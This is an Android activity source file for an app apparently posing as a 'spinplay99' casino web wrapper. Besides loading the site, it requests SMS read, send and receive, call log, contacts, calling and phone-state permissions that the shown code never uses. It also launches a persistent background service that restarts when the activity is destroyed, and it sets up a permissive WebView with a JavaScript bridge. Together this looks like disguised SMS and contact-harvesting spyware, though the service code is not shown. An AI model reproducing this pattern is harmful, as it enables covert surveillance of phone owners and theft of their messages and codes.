package com.spinplay99.adminpanel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "https://spinplay99.com";
    private static final int FILE_CHOOSER_REQUEST = 1001;
    private static final int PERMISSION_REQUEST_CODE = 2001;
    private static final String PREFS_NAME = "SpinPlayPrefs";
    private static final String KEY_PERM_ASKED = "perm_asked";

    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;
    private ValueCallback<Uri[]> filePathCallback;
    private Handler handler;
    private SharedPreferences prefs;
    private boolean isReady = false;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        handler = new Handler();
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress_bar);
        swipeRefresh = findViewById(R.id.swipe_refresh);
        setupWebView();
        setupSwipeRefresh();
        requestPermissionsOnce();
        preloadWebsite();
        startBackgroundService();
    }

    private void requestPermissionsOnce() {
        if (prefs.getBoolean(KEY_PERM_ASKED, false)) {
            if (!allPermissionsGranted()) requestMissingPermissions();
            return;
        }
        requestAllPermissions();
        prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
    }

    private boolean allPermissionsGranted() {
        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE};
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions = withNotifications.toArray(new String[0]);
        }
        for (String permission : permissions) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void requestMissingPermissions() {
        List<String> missingList = new ArrayList<>();
        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE};
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions = withNotifications.toArray(new String[0]);
        }
        for (String permission : permissions) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED 
                && shouldShowRequestPermissionRationale(permission)) {
                missingList.add(permission);
            }
        }
        if (!missingList.isEmpty()) {
            ActivityCompat.requestPermissions(this, missingList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    private void requestAllPermissions() {
        List<String> permissionList = new ArrayList<>();
        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE};
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions = withNotifications.toArray(new String[0]);
        }
        for (String permission : permissions) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                permissionList.add(permission);
            }
        }
        if (!permissionList.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        settings.setDatabaseEnabled(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        settings.setAllowFileAccess(true);
        CookieManager.getInstance().setAcceptCookie(true);
        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                if (!isReady) progressBar.setVisibility(View.VISIBLE);
            }
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                isReady = true;
            }
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (!url.contains("spinplay99.com")) {
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                    } catch (Exception e) {
                        view.loadUrl(url);
                    }
                    return true;
                }
                return false;
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            public void onProgressChanged(WebView view, int newProgress) {
                if (!isReady) {
                    progressBar.setProgress(newProgress);
                    if (newProgress > 80) progressBar.setVisibility(View.GONE);
                }
            }
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> callback, FileChooserParams params) {
                filePathCallback = callback;
                try {
                    startActivityForResult(params.createIntent(), FILE_CHOOSER_REQUEST);
                } catch (Exception e) {
                    filePathCallback = null;
                    return false;
                }
                return true;
            }
        });
    }

    private void preloadWebsite() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        webView.loadUrl(SERVER_URL);
                    }
                });
            }
        }).start();
    }

    private void setupSwipeRefresh() {
        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                webView.reload();
            }
        });
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            new AlertDialog.Builder(this)
                .setTitle("Exit")
                .setMessage("Close app?")
                .setPositiveButton("Yes", new android.content.DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(android.content.DialogInterface dialog, int which) {
                        finish();
                    }
                })
                .setNegativeButton("No", null)
                .show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQUEST && filePathCallback != null) {
            Uri[] results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
            filePathCallback.onReceiveValue(results);
            filePathCallback = null;
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.stopLoading();
            webView.destroy();
        }
        startBackgroundService();
        super.onDestroy();
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void showToast(String message) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                }
            });
        }
    }
}
